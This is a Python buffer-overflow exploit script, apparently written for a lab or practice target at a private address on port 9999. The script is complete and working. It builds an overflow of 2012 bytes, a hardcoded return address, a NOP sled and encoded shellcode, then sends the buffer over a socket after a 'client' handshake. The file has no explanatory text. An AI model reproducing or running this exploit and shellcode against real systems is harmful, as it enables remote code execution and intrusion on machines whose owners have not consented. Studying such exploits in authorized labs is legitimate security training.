import socket
import os

ip = "192.168.56.101"
port = 9999

prefix = ""
offset = 2012
overflow = "A" * offset
retn = "\xDF\x14\x50\x62"
padding = "\x90" * 32
payload = ("\xba\x16\x6c\x38\x39\xd9\xe8\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x55\x0e\x03\x43\x62\xda\xcc\x97\x92\x98"
"\x2f\x67\x63\xfd\xa6\x82\x52\x3d\xdc\xc7\xc5\x8d\x96\x85\xe9"
"\x66\xfa\x3d\x79\x0a\xd3\x32\xca\xa1\x05\x7d\xcb\x9a\x76\x1c"
"\x4f\xe1\xaa\xfe\x6e\x2a\xbf\xff\xb7\x57\x32\xad\x60\x13\xe1"
"\x41\x04\x69\x3a\xea\x56\x7f\x3a\x0f\x2e\x7e\x6b\x9e\x24\xd9"
"\xab\x21\xe8\x51\xe2\x39\xed\x5c\xbc\xb2\xc5\x2b\x3f\x12\x14"
"\xd3\xec\x5b\x98\x26\xec\x9c\x1f\xd9\x9b\xd4\x63\x64\x9c\x23"
"\x19\xb2\x29\xb7\xb9\x31\x89\x13\x3b\x95\x4c\xd0\x37\x52\x1a"
"\xbe\x5b\x65\xcf\xb5\x60\xee\xee\x19\xe1\xb4\xd4\xbd\xa9\x6f"
"\x74\xe4\x17\xc1\x89\xf6\xf7\xbe\x2f\x7d\x15\xaa\x5d\xdc\x72"
"\x1f\x6c\xde\x82\x37\xe7\xad\xb0\x98\x53\x39\xf9\x51\x7a\xbe"
"\xfe\x4b\x3a\x50\x01\x74\x3b\x79\xc6\x20\x6b\x11\xef\x48\xe0"
"\xe1\x10\x9d\xa7\xb1\xbe\x4e\x08\x61\x7f\x3f\xe0\x6b\x70\x60"
"\x10\x94\x5a\x09\xbb\x6f\x0d\xf6\x94\x57\xcc\x9e\xe6\xa7\xdf"
"\x02\x6e\x41\xb5\xaa\x26\xda\x22\x52\x63\x90\xd3\x9b\xb9\xdd"
"\xd4\x10\x4e\x22\x9a\xd0\x3b\x30\x4b\x11\x76\x6a\xda\x2e\xac"
"\x02\x80\xbd\x2b\xd2\xcf\xdd\xe3\x85\x98\x10\xfa\x43\x35\x0a"
"\x54\x71\xc4\xca\x9f\x31\x13\x2f\x21\xb8\xd6\x0b\x05\xaa\x2e"
"\x93\x01\x9e\xfe\xc2\xdf\x48\xb9\xbc\x91\x22\x13\x12\x78\xa2"
"\xe2\x58\xbb\xb4\xea\xb4\x4d\x58\x5a\x61\x08\x67\x53\xe5\x9c"
"\x10\x89\x95\x63\xcb\x09\xb5\x81\xd9\x67\x5e\x1c\x88\xc5\x03"
"\x9f\x67\x09\x3a\x1c\x8d\xf2\xb9\x3c\xe4\xf7\x86\xfa\x15\x8a"
"\x97\x6e\x19\x39\x97\xba")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  s.recv(1024)
  s.send(bytes("client\r\n", "latin-1"))
  data = s.recv(1024).decode()
  print(data)
  s.send(bytes(buffer, "latin-1"))
  s.recv(1024)
  s.close()
except:
  print("Could not connect.")
